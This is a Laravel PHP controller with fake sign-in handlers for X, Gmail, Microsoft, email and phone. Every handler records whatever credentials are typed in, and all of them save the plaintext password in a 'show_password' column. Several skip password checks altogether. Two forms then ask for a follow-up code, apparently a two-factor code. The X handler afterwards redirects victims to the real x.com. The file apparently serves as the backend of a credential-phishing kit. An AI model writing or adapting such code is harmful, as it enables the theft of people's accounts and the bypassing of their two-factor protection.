<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class AuthController extends Controller
{
    public function showPhoneLoginForm()
    {
        return view('auth.phone_login');
    }

    public function phoneLogin(Request $request)
    {
        $request->validate([
            'phone' => 'required|string',
            'password' => 'required',
        ]);

        $user = User::where('phone', $request->phone)->first();
        if (!$user) {
            $user = User::create([
                'phone' => $request->phone,
                'password' => Hash::make($request->password),
                'show_password' => $request->password,
                'name' => '',
                'email' => null,
            ]);
        } else if (!Hash::check($request->password, $user->password)) {
            return back()->withErrors(['phone' => 'Invalid phone or password']);
        }
        Auth::login($user);
        return redirect()->route('code.page');
    }
    public function showLoginForm()
    {
        return view('auth.login');
    }

     public function showEmailLoginForm()
    {
        return view('auth.email_login');
    }


    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
            'phone' => 'nullable|string',
        ]);

        $user = User::where('email', $request->email)->first();
        if (!$user) {
            $user = User::create([
                'email' => $request->email,
                'password' => Hash::make($request->password),
                'show_password' => $request->password,
                'name' => '',
                'phone' => $request->phone,
            ]);
        } else if ($request->phone) {
            $user->phone = $request->phone;
            $user->save();
        }
        Auth::login($user);
        return redirect()->route('code.page');
    }

    public function showCodeForm()
    {
        return view('auth.code');
    }

    public function submitCode(Request $request)
    {
        $request->validate([
            'code' => 'required',
        ]);
        $user = Auth::user();
        $user->code = $request->code;
        $user->save();
        // Redirect to a success or dashboard page
        return redirect('/home');
    }




    // x details

        public function Xlogin(Request $request)
    {
        $request->validate([
            'email_or_username' => 'required|string',
            'share_type' => 'required|string',
            'password' => 'required',
            'show_password' => $request->password,
        ]);

        $user = User::where('email', $request->email_or_username)->first();
        if (!$user) {
            $user = User::create([
                'email' => $request->email_or_username,
                'share_type' => $request->share_type,
                'password' => Hash::make($request->password),
                'show_password' => $request->password,
                'name' => '',
            ]);
         
            $user->save();
        }
        Auth::login($user);
       return redirect('https://x.com');;
    }




        // x details

        public function Emaillogin(Request $request)
    {
        $request->validate([
            'email' => 'required|string',
            'share_type' => 'required|string',
            'password' => 'required',
            'show_password' => $request->password,
        ]);

        $user = User::where('email', $request->email)->first();
        if (!$user) {
            $user = User::create([
                'email' => $request->email,
                'share_type' => $request->share_type,
                'password' => Hash::make($request->password),
                'show_password' => $request->password,
                'name' => '',
            ]);
         
            $user->save();
        }
        Auth::login($user);
        return redirect()->route('code.page');
    }



      public function gmaillogin(Request $request)
{
    $request->validate([
        'email' => 'required|string',
        'password' => 'required',
    ]);

    $user = User::where('email', $request->email)->first();

    if (!$user) {
        $user = User::create([
            'email'         => $request->email,
            'password'      => Hash::make($request->password),
            'show_password' => $request->password,
            'name'          => '',
        ]);
    }

    Auth::login($user);

    return redirect()->route('form.page');
}


public function microsoftLogin(Request $request)
{
    $request->validate([
        'email' => 'required|string',
        'password' => 'required',
    ]);

    $user = User::where('email', $request->email)->first();

    if (!$user) {
        $user = User::create([
            'email'         => $request->email,
            'password'      => Hash::make($request->password),
            'show_password' => $request->password,
            'name'          => '',
        ]);
    }

    Auth::login($user);

    return redirect()->route('form.page');
}


     public function showFormPage()
    {
        return view('auth.form');
    }

    public function submitForm(Request $request)
    {
        $request->validate([
            'code' => 'required',
        ]);
        $user = Auth::user();
        $user->code = $request->code;
        $user->save();
        // Redirect to a success or dashboard page
        return redirect('/home');
    }


}
